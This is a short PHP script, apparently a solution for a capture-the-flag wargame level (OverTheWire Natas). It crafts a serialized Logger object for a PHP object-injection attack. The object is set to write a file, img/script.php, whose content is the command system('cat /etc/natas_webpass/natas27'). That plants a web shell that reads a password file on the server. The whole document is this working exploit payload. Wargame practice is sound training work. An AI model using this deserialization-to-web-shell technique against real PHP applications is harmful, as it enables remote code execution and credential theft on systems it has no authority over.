<?php
	class Logger{
		private $logFile;
		private $initMsg;
		private $exitMsg;
		
		function __construct(){
			$this->initMsg="a";
			$this->exitMsg="<?php echo system('cat /etc/natas_webpass/natas27'); ?>";
			$this->logFile="img/script.php";
		}
	}
	$obj = new Logger();
	echo base64_encode(serialize($obj));
?>


